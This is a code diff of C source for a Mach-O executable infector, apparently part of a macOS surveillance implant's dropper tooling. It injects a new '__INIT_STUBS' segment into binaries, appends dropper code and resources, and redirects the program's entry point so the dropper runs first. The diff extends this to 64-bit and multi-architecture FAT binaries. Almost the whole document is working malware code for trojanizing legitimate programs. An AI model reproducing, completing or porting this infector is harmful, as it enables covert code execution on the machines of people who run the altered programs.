@@ -46,9 +46,9 @@
 #include "RCSMacInfector.h"
 #include "RCSMacDropper.h"
 
-#define VERSION           0.9.2
 #define INJECTED_SEGMENT  "__INIT_STUBS"
 //#define DEBUG
+//#define DEBUG_VERBOSE
 
 //extern void dropperStart ();
 //extern void labelTest ();
@@ -62,8 +62,11 @@
 #define DROPPER_CODE_SIZE		  ((byte *)dropperEnd - (byte *)dropperStart)
 #define FIRST_STAGE_CODE_SIZE	((byte *)firstStageDropper - (byte *)labelTest)
 
+uint32_t gShiftSize = 0;
+uint32_t gOutSize   = 0;
 
-unsigned int getBinaryEP (byte *machoBase)
+
+uint32_t getBinaryEP_32 (byte *machoBase)
 {
   struct mach_header *m_header;
   struct load_command *l_command;
@@ -98,8 +101,44 @@ unsigned int getBinaryEP (byte *machoBase)
   return -1;
 }
 
+uint64_t getBinaryEP_64 (byte *machoBase)
+{
+  struct mach_header_64 *m_header;
+  struct load_command *l_command;
+
+  unsigned int i;
+  unsigned int offset;
+  uint64_t entryPoint;
+
+  m_header =(struct mach_header_64 *) machoBase;
+  offset  = sizeof (struct mach_header_64);
+  
+  for (i = 0; i < m_header->ncmds; i++)
+    {
+      l_command = (struct load_command *)((byte *)machoBase + offset);
+      
+      if (l_command->cmd == LC_THREAD
+          || l_command->cmd == LC_UNIXTHREAD)
+        {
+          struct thread_command_64 *th_command;
+          
+          th_command = (struct thread_command_64 *) allocate (sizeof (struct thread_command_64));
+          memcpy (th_command, machoBase + offset, sizeof (struct thread_command_64));
+          
+          entryPoint = th_command->state.rip;
+          free (th_command);
+          
+          return entryPoint;
+        }
+        
+      offset += l_command->cmdsize;
+    }
+  
+  return -1;
+}
+
 int
-setBinaryEP (byte *machoBase, unsigned int anEntryPoint)
+setBinaryEP_32 (byte *machoBase, uint32_t anEntryPoint)
 {
   struct mach_header *m_header;
   struct load_command *l_command;
@@ -117,6 +156,9 @@ setBinaryEP (byte *machoBase, unsigned int anEntryPoint)
       if (l_command->cmd == LC_THREAD
           || l_command->cmd == LC_UNIXTHREAD)
         {
+#ifdef DEBUG
+          printf("Found LC_THREAD for setting ep\n");
+#endif
           struct thread_command *th_command;
           
           th_command = (thread_command *) allocate (sizeof (struct thread_command));
@@ -135,16 +177,55 @@ setBinaryEP (byte *machoBase, unsigned int anEntryPoint)
   return -1;
 }
 
+int
+setBinaryEP_64 (byte *machoBase, uint64_t anEntryPoint)
+{
+  struct mach_header_64 *m_header;
+  struct load_command *l_command;
+  
+  unsigned int i;
+  unsigned int offset;
+  
+  m_header = (struct mach_header_64 *) machoBase;
+  offset  = sizeof (struct mach_header_64);
+  
+  for (i = 0; i < m_header->ncmds; i++)
+    {
+      l_command = (struct load_command *)(machoBase + offset);
+      
+      if (l_command->cmd == LC_THREAD
+          || l_command->cmd == LC_UNIXTHREAD)
+        {
+          struct thread_command_64 *th_command;
+          
+          th_command = (thread_command_64 *) allocate (sizeof (struct thread_command_64));
+          memcpy (th_command, machoBase + offset, sizeof (struct thread_command_64));
+          
+          th_command->state.rip = anEntryPoint;
+          memcpy (machoBase + offset, th_command, sizeof (struct thread_command_64));
+          free (th_command);  
+          
+          return 0;
+        }
+      
+      offset += l_command->cmdsize;
+    }
+  
+  return -1;
+}
+
 int appendData (char *inputFilePointer,
                 char *outputFilePointer,
-                int archOffset,
+                int inArchOffset,
+                int outArchOffset,
                 int padding,
-                unsigned int segmentVMAddr)
+                uint32_t segmentVMAddr,
+                bool is64bitArch)
 {
   char *tempFilePointer   = NULL;
   const char *_strings[]  = { "HOME", "%s/%s/%s", "%s/%s", "/%s", "Library", "Preferences", "" };
   
-  unsigned int originalEP = 0;
+  uint32_t originalEP     = 0;
   int tempFileSize        = 0; 
 #ifdef WIN32
   HANDLE tempFD, tempFDMap;
@@ -163,7 +244,11 @@ int appendData (char *inputFilePointer,
   else
     numberOfResources = 4;
   
-  originalEP = getBinaryEP ((byte *)(inputFilePointer + archOffset));
+  //if (is64bitArch)
+  //  originalEP = getBinaryEP_64 ((byte *)(inputFilePointer + inArchOffset));
+  //else
+    originalEP = getBinaryEP_32 ((byte *)(inputFilePointer + inArchOffset));
+
 #ifdef DEBUG
   printf ("Original EP: %x\n", originalEP);
 #endif
@@ -210,13 +295,27 @@ int appendData (char *inputFilePointer,
     }
   
   // Set the new EP + 4 (number of Resources)
-  if (setBinaryEP ((byte *)(outputFilePointer + archOffset),
-                   segmentVMAddr
-                   + sizeof (infectionHeader)
-                   + sizeof (stringTable) * gNumStrings) == -1)
+  if (is64bitArch)
     {
-      printf ("[ee] An error occurred while setting the new EP\n");
-      exit (1);
+      if (setBinaryEP_64 ((byte *)(outputFilePointer + outArchOffset),
+                          segmentVMAddr
+                          + sizeof (infectionHeader)
+                          + sizeof (stringTable) * gNumStrings) == -1)
+        {
+          printf ("[ee] An error occurred while setting the new EP\n");
+          exit (1);
+        }
+    }
+  else
+    {
+      if (setBinaryEP_32 ((byte *)(outputFilePointer + outArchOffset),
+                          (uint32_t)segmentVMAddr
+                          + sizeof (infectionHeader)
+                          + sizeof (stringTable) * gNumStrings) == -1)
+        {
+          printf ("[ee] An error occurred while setting the new EP\n");
+          exit (1);
+        }
     }
   
   //
@@ -492,7 +591,8 @@ int appendData (char *inputFilePointer,
 
 int infectSingleArch (char *inputFilePointer,
                       char *outputFilePointer,
-                      int offsetToArch,
+                      int inOffsetToArch,
+                      int outOffsetToArch,
                       int inputFileSize,
                       int outputFileSize)
 {
@@ -508,8 +608,14 @@ int infectSingleArch (char *inputFilePointer,
   int displacement          = 0;
   int padding               = 0;
   
-  inputOffset   += offsetToArch;
-  outputOffset  += offsetToArch;
+#ifdef DEBUG
+  printf("input offset: %d\n", inputOffset);
+  printf("inOffsetToArch: %d\n", inOffsetToArch);
+  printf("inputFileSize: %d\n", inputFileSize);
+#endif
+
+  inputOffset   += inOffsetToArch;
+  outputOffset  += outOffsetToArch;
   
   m_header =  (struct mach_header *) allocate (sizeof (struct mach_header));
   memcpy (m_header, inputFilePointer + inputOffset, sizeof (struct mach_header));
@@ -656,13 +762,18 @@ int infectSingleArch (char *inputFilePointer,
 #endif
                 mySegment->vmaddr   = seg_command->vmaddr + seg_command->vmsize;
                 mySegment->vmsize   = outputFileSize;
-                mySegment->fileoff  = inputFileSize + padding - offsetToArch;
+                
+                // XXX: Check this out if it's in|out
+                mySegment->fileoff  = inputFileSize + padding - outOffsetToArch;
+
                 mySegment->filesize = outputFileSize;
                 mySegment->maxprot  = 0x7;
                 mySegment->initprot = 0x5;
                 
                 segVMAddr = mySegment->vmaddr;
-                
+#ifdef DEBUG
+                printf("Segment VMAddr: %d (0x%08x)\n)", segVMAddr, segVMAddr);
+#endif
                 memcpy (outputFilePointer + outputOffset, mySegment, sizeof (struct segment_command));
                 outputOffset += sizeof (struct segment_command);
               }
@@ -780,15 +891,17 @@ int infectSingleArch (char *inputFilePointer,
   printf("[ii] outputFilePointer: 0x%08x\n", outputFilePointer);
   printf("[ii] outputOffset     : 0x%08x\n", outputOffset);
   printf("[ii] outputFileSize   : 0x%08x\n", outputFileSize);
-  printf("[ii] offsetToArch     : 0x%08x\n", offsetToArch);
+  printf("[ii] inOffsetToArch   : 0x%08x\n", inOffsetToArch);
+  printf("[ii] outOffsetToArch  : 0x%08x\n", outOffsetToArch);
 #endif
+  
   //
   // Now the rest of the file (data), here we wanna skip sizeof segment_command
   // in order to leave the file padded correctly for its TEXT segment
   //
   memcpy (outputFilePointer + outputOffset,
           inputFilePointer + inputOffset + sizeof (struct segment_command),
-          inputFileSize - inputOffset - sizeof (struct segment_command));
+          inputFileSize - (inputOffset - inOffsetToArch) - sizeof (struct segment_command));
   
   free (m_header);
   printf ("[ii] LoadCommands copied successfully\n");
@@ -796,16 +909,348 @@ int infectSingleArch (char *inputFilePointer,
 #ifdef DEBUG_VERBOSE
   printf ("inputFilePointer: %x\n", inputFilePointer);
   printf ("inputFilePointer: %x\n", *(unsigned long *)inputFilePointer);
-  printf ("offsetToArch: %x\n", offsetToArch);
+  printf ("[ii] inOffsetToArch   : 0x%08x\n", inOffsetToArch);
+  printf ("[ii] outOffsetToArch  : 0x%08x\n", outOffsetToArch);
   printf ("inputFilePointer: %x\n", *(unsigned long *)(inputFilePointer + 0x1000));
   printf ("inputSize + padding: %d\n", inputFileSize + padding);
 #endif
   
   if (appendData (inputFilePointer,
                   outputFilePointer,
-                  offsetToArch,
+                  inOffsetToArch,
+                  outOffsetToArch,
                   inputFileSize + padding,
-                  segVMAddr) != kErrorGeneric)
+                  segVMAddr,
+                  false) != kErrorGeneric)
+    return padding;
+  else
+    return kErrorGeneric;
+}
+
+int infectSingleArch64 (char *inputFilePointer,
+                        char *outputFilePointer,
+                        int inOffsetToArch,
+                        int outOffsetToArch,
+                        int inputFileSize,
+                        int outputFileSize)
+{
+  struct mach_header_64       *m_header;
+  struct load_command         *l_command;
+  struct segment_command_64   *seg_command;
+  
+  unsigned int z;
+  unsigned int i;
+  uint32_t inputOffset  = 0;
+  uint32_t outputOffset = 0;
+  uint32_t segVMAddr    = 0;
+  int displacement          = 0;
+  int padding               = 0;
+  
+  inputOffset   += inOffsetToArch;
+  outputOffset  += outOffsetToArch;
+  
+  m_header =  (struct mach_header_64 *) allocate (sizeof (struct mach_header_64));
+  memcpy (m_header, inputFilePointer + inputOffset, sizeof (struct mach_header_64));
+  
+  // TODO: Add check for cputype as well
+  if (m_header->filetype != MH_EXECUTE)
+    {
+      printf ("[ee] Unsupported file type (!= MH_EXECUTE)\n");
+      return kErrorFileNotSupported;
+    }
+  
+  //m_header->sizeofcmds += sizeof (struct section);
+  
+  // Increment header sizeofcmds since we're adding a new segment
+  m_header->sizeofcmds += sizeof (struct segment_command_64);
+  m_header->ncmds      += 1;
+  
+  memcpy (outputFilePointer + outputOffset, m_header, sizeof (struct mach_header_64));
+  
+  // Calculate padding including loader code size
+  displacement  = inputFileSize % PAGE_ALIGNMENT;
+  padding       = PAGE_ALIGNMENT - displacement;
+  
+  outputOffset += sizeof (struct mach_header_64);
+  inputOffset  += sizeof (struct mach_header_64);
+#ifdef DEBUG
+  printf ("[ii] Starting parsing load_commands\n");
+#endif
+  for (i = 0; i < m_header->ncmds; i++)
+    {
+      l_command = (struct load_command *)(inputFilePointer + inputOffset);
+#ifdef DEBUG_VERBOSE
+      printf ("loadCommand: %d (%x)\n", i, l_command->cmd);
+#endif
+      switch (l_command->cmd)
+        {
+        case LC_THREAD:
+        /*case LC_UNIXTHREAD:
+          {
+            struct thread_command *th_command;
+            
+            th_command = (thread_command *) allocate (sizeof (struct thread_command));
+            memcpy (th_command, inputFilePointer + inputOffset, sizeof (struct thread_command));
+            
+            //th_command->state.eip += sizeof (struct section);
+            //th_command->state.eip = 0x8; // W00t
+            
+            memcpy (outputFilePointer + outputOffset, th_command, sizeof (struct thread_command_64));
+            free (th_command);
+            
+            inputOffset += sizeof (struct thread_command);
+            outputOffset += sizeof (struct thread_command);
+            
+            break;
+          }*/
+        case LC_SEGMENT:
+          {
+#ifdef DEBUG
+            printf ("LC_SEGMENT size: %d\n", (int)(sizeof (struct segment_command_64)));
+#endif
+            seg_command = (segment_command_64 *) allocate (sizeof (struct segment_command_64));
+            memcpy (seg_command, inputFilePointer + inputOffset, sizeof (struct segment_command_64));
+            
+            inputOffset += sizeof (struct segment_command_64);
+            
+#ifdef DEBUG_VERBOSE
+            printf("segname: %s\n", seg_command->segname);
+#endif
+
+            if (!strncmp (seg_command->segname, "__PAGEZERO",
+                          strlen (seg_command->segname)))
+              {
+#ifdef DEBUG
+                printf ("[ii] Found __PAGEZERO Segment\n");
+#endif  
+                //
+                // Update the segment within the new prot flags(EP) and size
+                //
+                //seg_command->cmdsize  += sizeof (struct section);
+                /*
+                 seg_command->fileoff  = fileSize + padding;
+                 
+                 //seg_command->filesize = outputFileSize;
+                 seg_command->filesize = FIRST_STAGE_CODE_SIZE;
+                 
+                 if (seg_command->filesize % PAGE_ALIGNMENT)
+                 seg_command->filesize = ((seg_command->filesize + PAGE_ALIGNMENT)
+                 & ~(PAGE_ALIGNMENT -1));
+                 
+                 //seg_command->vmsize = paddedPagezeroVASize = outputFileSize; // PageBoundary padding 4K
+                 seg_command->vmsize = seg_command->filesize;
+                 
+                 seg_command->maxprot  = 0x7;
+                 seg_command->initprot = 0x5;
+                 //seg_command->nsects   += 0x1;
+                 */
+                // Copy back the segmentCommand
+                memcpy (outputFilePointer + outputOffset, seg_command, sizeof (struct segment_command_64));
+                outputOffset += sizeof (struct segment_command_64);
+                /*
+                 //
+                 // Create the new section
+                 //
+                 printf ("[ii] section size: %d\n", (int)(sizeof (struct section)));
+                 sect = allocate (sizeof (struct section));
+                 
+                 if (sect == NULL)
+                 {
+                 printf("[ee] Error while allocating the new section\n");
+                 return kErrorMemoryAllocation;
+                 }
+                 
+                 strcpy (sect->sectname, INJECTED_SECTION_NAME);
+                 strcpy (sect->segname, INJECTED_SEGMENT_NAME);
+                 //sect->addr    = stackSize;
+                 sect->offset  = fileSize + padding;
+                 sect->size    = outputFileSize; //TOP_STACK - stackSize; // size of the stack
+                 sect->align   = 0x2; // standard alignment
+                 sect->flags   = 0x80000000; // x flag
+                 
+                 // Copy back the section
+                 memcpy (outputFilePointer + outputOffset, sect, sizeof (struct section));
+                 outputOffset += sizeof (struct section);
+                 
+                 free (sect);
+                 */
+              }
+            else if (!strncmp (seg_command->segname, "__LINKEDIT",
+                               strlen (seg_command->segname)))
+              {
+#ifdef DEBUG
+                printf ("[ii] Found %s Segment\n", seg_command->segname);
+#endif  
+                memcpy (outputFilePointer + outputOffset, seg_command, sizeof (struct segment_command_64));
+                outputOffset += sizeof (struct segment_command_64);
+                
+                //
+                // Now inject the new segment
+                //
+                struct segment_command_64 *mySegment = (struct segment_command_64 *) allocate (sizeof (struct segment_command_64));
+                
+                mySegment->cmd      = LC_SEGMENT;
+                mySegment->cmdsize  = sizeof (struct segment_command_64);
+#ifdef WIN32
+				strncpy_s(mySegment->segname, strlen(INJECTED_SEGMENT), INJECTED_SEGMENT, _TRUNCATE);
+#else
+                strncpy (mySegment->segname, INJECTED_SEGMENT, strlen (INJECTED_SEGMENT));
+#endif
+                mySegment->vmaddr   = seg_command->vmaddr + seg_command->vmsize;
+                mySegment->vmsize   = outputFileSize;
+
+                // XXX: Check this out outOffsetToArch
+                mySegment->fileoff  = inputFileSize + padding - outOffsetToArch;
+
+                mySegment->filesize = outputFileSize;
+                mySegment->maxprot  = 0x7;
+                mySegment->initprot = 0x5;
+                
+                //segVMAddr = mySegment->vmaddr;
+                
+                memcpy (outputFilePointer + outputOffset, mySegment, sizeof (struct segment_command_64));
+                outputOffset += sizeof (struct segment_command_64);
+              }
+            else
+              {
+                //
+                // Shift all the VM Addresses
+                //
+                //seg_command->vmaddr += paddedPagezeroVASize - PAGE_ALIGNMENT;
+                
+                memcpy (outputFilePointer + outputOffset,
+                        seg_command,
+                        sizeof (struct segment_command_64));
+                outputOffset += sizeof (struct segment_command_64);
+#ifdef DEBUG
+                printf ("[ii] Cycling for segment (%s) sections (%d)\n",
+                        seg_command->segname, seg_command->nsects);
+#endif  
+                for (z = 0; z < seg_command->nsects; z++)
+                  {
+                    struct section_64 *sect;
+                    
+                    sect = (struct section_64 *) allocate (sizeof (struct section_64));
+                    if (sect == NULL)
+                      {
+                        printf("[ee] Error while allocating the new section\n");
+                        return kErrorMemoryAllocation;
+                      }
+                    memcpy (sect, inputFilePointer + inputOffset, sizeof (struct section_64));
+                    
+                    //sect->offset += sizeof (struct section);
+                    //sect->addr += paddedPagezeroVASize - PAGE_ALIGNMENT;
+                    
+                    memcpy (outputFilePointer + outputOffset,
+                            sect,
+                            sizeof (struct section_64));
+                    
+                    free (sect);
+                    inputOffset += sizeof (struct section_64);
+                    outputOffset += sizeof (struct section_64);
+                  }
+              }
+            
+            free (seg_command);
+            
+            break;
+          }
+        /*case LC_SYMTAB:
+          {
+            struct symtab_command *sy_command;
+            sy_command = (symtab_command *) allocate (sizeof (struct symtab_command));
+            memcpy (sy_command, inputFilePointer + inputOffset, sizeof (struct symtab_command));
+            
+            //sy_command->symoff += sizeof (struct section);
+            //sy_command->stroff += sizeof (struct section);
+            
+            memcpy (outputFilePointer + outputOffset, sy_command, sizeof (struct symtab_command));
+            free (sy_command);
+            
+            inputOffset += sizeof (struct symtab_command);
+            outputOffset += sizeof (struct symtab_command);
+            
+            break;
+          }
+        case LC_DYSYMTAB:
+          {
+            struct dysymtab_command *dysym_command;
+            dysym_command = (dysymtab_command *) allocate (sizeof (struct dysymtab_command));
+            memcpy (dysym_command, inputFilePointer + inputOffset, sizeof (struct dysymtab_command));
+            
+            //dysym_command->indirectsymoff += sizeof (struct section);
+            
+            memcpy (outputFilePointer + outputOffset, dysym_command, sizeof (struct dysymtab_command));
+            free (dysym_command);
+            
+            inputOffset += sizeof (struct dysymtab_command);
+            outputOffset += sizeof (struct dysymtab_command);
+            
+            break;
+          }
+        case LC_CODE_SIGNATURE:
+        case LC_SEGMENT_SPLIT_INFO:
+          {
+            struct linkedit_data_command *linkedit_command;
+            linkedit_command = (linkedit_data_command *) allocate (sizeof (struct linkedit_data_command));
+            memcpy (linkedit_command, inputFilePointer + inputOffset, sizeof (struct linkedit_data_command));
+            
+            //linkedit_command->dataoff += sizeof (struct section);
+            
+            memcpy (outputFilePointer + outputOffset, linkedit_command, sizeof (struct linkedit_data_command));
+            free (linkedit_command);
+            
+            inputOffset += sizeof (struct linkedit_data_command);
+            outputOffset += sizeof (struct linkedit_data_command);
+            
+            break;
+          }*/
+        default:
+          {
+            memcpy (outputFilePointer + outputOffset,
+                    inputFilePointer + inputOffset,
+                    l_command->cmdsize);
+            inputOffset += l_command->cmdsize;
+            outputOffset += l_command->cmdsize;
+            
+            break;
+          }
+        }
+    }
+
+#ifdef DEBUG
+  printf("[ii] inputFilePointer : 0x%08x\n", inputFilePointer);
+  printf("[ii] inputOffset      : 0x%08x\n", inputOffset);
+  printf("[ii] inputFileSize    : 0x%08x\n", inputFileSize);
+  printf("[ii] outputFilePointer: 0x%08x\n", outputFilePointer);
+  printf("[ii] outputOffset     : 0x%08x\n", outputOffset);
+  printf("[ii] outputFileSize   : 0x%08x\n", outputFileSize);
+#endif
+  //
+  // Now the rest of the file (data), here we wanna skip sizeof segment_command
+  // in order to leave the file padded correctly for its TEXT segment
+  //
+  memcpy (outputFilePointer + outputOffset,
+          inputFilePointer + inputOffset + sizeof (struct segment_command_64),
+          inputFileSize - inputOffset - sizeof (struct segment_command_64));
+  
+  free (m_header);
+  printf ("[ii] LoadCommands copied successfully\n");
+  
+#ifdef DEBUG_VERBOSE
+  printf ("inputFilePointer: %x\n", inputFilePointer);
+  printf ("inputFilePointer: %x\n", *(unsigned long *)inputFilePointer);
+  printf ("inputFilePointer: %x\n", *(unsigned long *)(inputFilePointer + 0x1000));
+  printf ("inputSize + padding: %d\n", inputFileSize + padding);
+#endif
+  
+  if (appendData (inputFilePointer,
+                  outputFilePointer,
+                  inOffsetToArch,
+                  outOffsetToArch,
+                  inputFileSize + padding,
+                  segVMAddr,
+                  true) != kErrorGeneric)
     return padding;
   else
     return kErrorGeneric;
@@ -1138,15 +1583,15 @@ main (int argc, _mChar *argv[])
         printf ("[ii] FAT Binary found\n");
         printf ("[ii] Found %d Arch(s)\n", nfat);
 
-        if (nfat > 2)
+        if (nfat > 4)
           {
             printf ("[ii] Error: unsupported format (too many archs)\n");
             
             return kErrorGeneric;
           }
 
-        memcpy (outputFilePointer, &gFatHeader, sizeof (gFatHeader));
-        outputOffset  += sizeof (gFatHeader);
+        //memcpy (outputFilePointer, &gFatHeader, sizeof (gFatHeader));
+        //outputOffset  += sizeof (gFatHeader);
         inputOffset   += sizeof (gFatHeader);
 
         for (i = 0; i < nfat; i++)
@@ -1161,67 +1606,101 @@ main (int argc, _mChar *argv[])
             printf ("[ii] cputype: %d\n", cputype);
             printf ("[ii] archOffset: 0x%x\n", archOffset);
 #endif
+
             if (cputype == CPU_TYPE_X86)
               {
-                x86Found++;
+                uint32_t arch_offt_padded = archOffset;
 
-                if (otherFound == 1)
+                if (gShiftSize > 0)
                   {
-                    offsetToResources = infectSingleArch ((char *)(inputFilePointer),
-                                                          (char *)(outputFilePointer),
-                                                          archOffset,
-                                                          gInputFileSize,
-                                                          outputFileSize);
-                  }
-                else
-                  {
-                    offsetToResources = infectSingleArch ((char *)(inputFilePointer),
-                                                          (char *)(outputFilePointer),
-                                                          archOffset,
-                                                          fArchSize,
-                                                          outputFileSize);
+                    arch_offt_padded += gShiftSize;
+                    
+                    if (arch_offt_padded % PAGE_ALIGNMENT)
+                      arch_offt_padded = ((arch_offt_padded + PAGE_ALIGNMENT) & ~(PAGE_ALIGNMENT - 1));
                   }
 
+                offsetToResources = infectSingleArch ((char *)(inputFilePointer),
+                                                      (char *)(outputFilePointer),
+                                                      archOffset,
+                                                      0,//arch_offt_padded,
+                                                      fArchSize,
+                                                      outputFileSize);
+
+                gShiftSize += sizeof (struct segment_command)
+                              + outputFileSize
+                              + offsetToResources;
+                
 #ifdef DEBUG
                 printf("offsetToRes: %d\n", offsetToResources);
 #endif
                 fArchSize += sizeof (struct segment_command)
+                             + outputFileSize
+                             + offsetToResources;
+                f_arch->size = fArchSize;
+                
+                if (i > 0)
+                  {
+                    f_arch->offset = arch_offt_padded;
+                  }
+              }
+            /*else if (cputype == CPU_TYPE_X86_64)
+              {
+                uint32_t arch_offt_padded = archOffset;
+
+                if (gShiftSize > 0)
+                  {
+                    arch_offt_padded += gShiftSize;
+                    
+                    if (arch_offt_padded % PAGE_ALIGNMENT)
+                      arch_offt_padded = ((arch_offt_padded + PAGE_ALIGNMENT) & ~(PAGE_ALIGNMENT - 1));
+                  }
+
+                offsetToResources = infectSingleArch64 ((char *)(inputFilePointer),
+                                                        (char *)(outputFilePointer),
+                                                        archOffset,
+                                                        arch_offt_padded,
+                                                        fArchSize,
+                                                        outputFileSize);
+
+                gShiftSize += sizeof (struct segment_command)
                               + outputFileSize
                               + offsetToResources;
-
+                
+#ifdef DEBUG
+                printf("offsetToRes: %d\n", offsetToResources);
+#endif
+                
+                fArchSize += sizeof (struct segment_command)
+                             + outputFileSize
+                             + offsetToResources;
                 f_arch->size = fArchSize;
-                //offsetToResources -= archOffset;
+                
+                if (i > 0)
+                  {
+                    f_arch->offset = arch_offt_padded;
+                  }
               }
             else
               {
-                if (x86Found)
+                uint32_t arch_offt_padded = archOffset;
+                
+                if (gShiftSize > 0)
                   {
-                    archOffset += offsetToResources + outputFileSize + sizeof(struct segment_command);
-
-                    if (archOffset % PAGE_ALIGNMENT)
-                      archOffset = ((archOffset + PAGE_ALIGNMENT) & ~(PAGE_ALIGNMENT - 1));
-#ifdef DEBUG_VERBOSE
-                    printf ("new Offset: 0x%x\n", archOffset);
-#endif
-                  }
-                else
-                  {
-                    otherFound++;
+                    arch_offt_padded += gShiftSize;
+                    
+                    if (arch_offt_padded % PAGE_ALIGNMENT)
+                      arch_offt_padded = ((arch_offt_padded + PAGE_ALIGNMENT) & ~(PAGE_ALIGNMENT - 1));
                   }
 
-                u_int tempOfft = f_arch->offset;
-                u_int tempSize = f_arch->size;
+                f_arch->offset = arch_offt_padded;
 
-                f_arch->offset = archOffset;
-
-                memcpy (outputFilePointer + archOffset,
-                        inputFilePointer + tempOfft,
-                        tempSize);
+                memcpy (outputFilePointer + arch_offt_padded,
+                        inputFilePointer + archOffset,
+                        fArchSize);
               }
-
-            //f_arch->size = SWAP_LONG (f_arch->size);
+            
             memcpy (outputFilePointer + outputOffset, f_arch, sizeof (struct fat_arch));
-
+            */
             free (f_arch);
             inputOffset   += sizeof (struct fat_arch);
             outputOffset  += sizeof (struct fat_arch);
@@ -1241,15 +1720,15 @@ main (int argc, _mChar *argv[])
         printf ("[ii] FAT (swapped) Binary found\n");
         printf ("[ii] Found %d Arch(s)\n", nfat);
         
-        if (nfat > 2)
+        if (nfat > 4)
           {
             printf ("[ii] Error: unsupported format (too many archs)\n");
 
             return kErrorGeneric;
           }
 
-        memcpy (outputFilePointer, &gFatHeader, sizeof (gFatHeader));
-        outputOffset  += sizeof (gFatHeader);
+        //memcpy (outputFilePointer, &gFatHeader, sizeof (gFatHeader));
+        //outputOffset  += sizeof (gFatHeader);
         inputOffset   += sizeof (gFatHeader);
         
         for (i = 0; i < nfat; i++)
@@ -1264,15 +1743,25 @@ main (int argc, _mChar *argv[])
             printf ("[ii] cputype: %d\n", cputype);
             printf ("[ii] archOffset: 0x%x\n", archOffset);
 #endif
+            
             if (cputype == CPU_TYPE_X86)
               {
-                x86Found++;
-                
+                uint32_t arch_offt_padded = archOffset;
+
+                if (gShiftSize > 0)
+                  {
+                    arch_offt_padded += gShiftSize;
+                    
+                    if (arch_offt_padded % PAGE_ALIGNMENT)
+                      arch_offt_padded = ((arch_offt_padded + PAGE_ALIGNMENT) & ~(PAGE_ALIGNMENT - 1));
+                  }
+
                 if (otherFound == 1)
                   {
                     offsetToResources = infectSingleArch ((char *)(inputFilePointer),
                                                           (char *)(outputFilePointer),
                                                           archOffset,
+                                                          0,//arch_offt_padded,
                                                           gInputFileSize,
                                                           outputFileSize);
                   }
@@ -1281,50 +1770,110 @@ main (int argc, _mChar *argv[])
                     offsetToResources = infectSingleArch ((char *)(inputFilePointer),
                                                           (char *)(outputFilePointer),
                                                           archOffset,
+                                                          0,//arch_offt_padded,
                                                           fArchSize,
                                                           outputFileSize);
                   }
 
+                gShiftSize += sizeof (struct segment_command)
+                              + outputFileSize
+                              + offsetToResources;
+                
+#ifdef DEBUG
+                printf("offsetToRes: %d\n", offsetToResources);
+#endif
                 fArchSize += sizeof (struct segment_command)
                              + outputFileSize
                              + offsetToResources;
                 
                 f_arch->size = SWAP_LONG (fArchSize);
-                //offsetToResources -= archOffset;
-              }
-            else
-              {
-                if (x86Found)
+                
+                if (i > 0)
                   {
-                    archOffset += offsetToResources + outputFileSize + sizeof(struct segment_command);
+                    f_arch->offset = SWAP_LONG (arch_offt_padded);
+                  }
+              }
+            /*else if (cputype == CPU_TYPE_X86_64)
+              {
+                uint32_t arch_offt_padded = archOffset;
 
-                    if (archOffset % PAGE_ALIGNMENT)
-                      archOffset = ((archOffset + PAGE_ALIGNMENT) & ~(PAGE_ALIGNMENT - 1));
-#ifdef DEBUG_VERBOSE
-                    printf ("new Offset: 0x%x\n", archOffset);
-#endif
+                if (gShiftSize > 0)
+                  {
+                    arch_offt_padded += gShiftSize;
+                    
+                    if (arch_offt_padded % PAGE_ALIGNMENT)
+                      arch_offt_padded = ((arch_offt_padded + PAGE_ALIGNMENT) & ~(PAGE_ALIGNMENT - 1));
+                  }
+
+                if (otherFound == 1)
+                  {
+                    offsetToResources = infectSingleArch64 ((char *)(inputFilePointer),
+                                                            (char *)(outputFilePointer),
+                                                            archOffset,
+                                                            arch_offt_padded,
+                                                            gInputFileSize,
+                                                            outputFileSize);
                   }
                 else
                   {
-                    otherFound++;
+                    offsetToResources = infectSingleArch64 ((char *)(inputFilePointer),
+                                                            (char *)(outputFilePointer),
+                                                            archOffset,
+                                                            arch_offt_padded,
+                                                            fArchSize,
+                                                            outputFileSize);
                   }
 
-                u_int tempOfft = SWAP_LONG (f_arch->offset);
-                u_int tempSize = SWAP_LONG (f_arch->size);
+                gShiftSize += sizeof (struct segment_command)
+                              + outputFileSize
+                              + offsetToResources;
                 
-                f_arch->offset = SWAP_LONG (archOffset);
-
-                memcpy (outputFilePointer + archOffset,
-                        inputFilePointer + tempOfft,
-                        tempSize);
+#ifdef DEBUG
+                printf("offsetToRes: %d\n", offsetToResources);
+#endif
+                fArchSize += sizeof (struct segment_command)
+                             + outputFileSize
+                             + offsetToResources;
+                f_arch->size = SWAP_LONG (fArchSize);
+                
+                if (i > 0)
+                  {
+                    f_arch->offset = SWAP_LONG (arch_offt_padded);
+                  }
               }
-            
-            //f_arch->size = SWAP_LONG (f_arch->size);
+            else
+              {
+                uint32_t arch_offt_padded = archOffset;
+                otherFound++;
+
+                if (gShiftSize > 0)
+                  {
+#ifdef DEBUG
+                    printf("[ii] arch_offt_padded: %d\n", arch_offt_padded);
+                    printf("[ii] Should shift: %d\n", gShiftSize);
+#endif
+                    arch_offt_padded += gShiftSize;
+                    
+                    if (arch_offt_padded % PAGE_ALIGNMENT)
+                      arch_offt_padded = ((arch_offt_padded + PAGE_ALIGNMENT) & ~(PAGE_ALIGNMENT - 1));
+#ifdef DEBUG
+                    printf("[ii] Padded shift: %d\n", arch_offt_padded);
+#endif
+                  }
+
+                f_arch->offset = SWAP_LONG (arch_offt_padded);
+
+                memcpy (outputFilePointer + arch_offt_padded,
+                        inputFilePointer + archOffset,
+                        fArchSize);
+              }
+
             memcpy (outputFilePointer + outputOffset, f_arch, sizeof (struct fat_arch));
-            
+            */
             free (f_arch);
             inputOffset   += sizeof (struct fat_arch);
-            outputOffset  += sizeof (struct fat_arch);
+            gOutSize = fArchSize;
+            //outputOffset  += sizeof (struct fat_arch);
           }
         
         break;
@@ -1336,6 +1885,7 @@ main (int argc, _mChar *argv[])
         
         if ((offsetToResources = infectSingleArch (inputFilePointer,
                                                    outputFilePointer,
+                                                   0,
                                                    0,
                                                    gInputFileSize,
                                                    outputFileSize)) < 0)
@@ -1380,6 +1930,13 @@ main (int argc, _mChar *argv[])
 
   CloseHandle(outputFDMap);
   CloseHandle(inputFDMap);
+
+  if (gFileType != 3)
+    {
+      SetFilePointer(outputFD, gOutSize, 0, FILE_BEGIN);
+      SetEndOfFile(outputFD);
+    }
+
   CloseHandle(outputFD);
   CloseHandle(inputFD);
   //freeArguments();
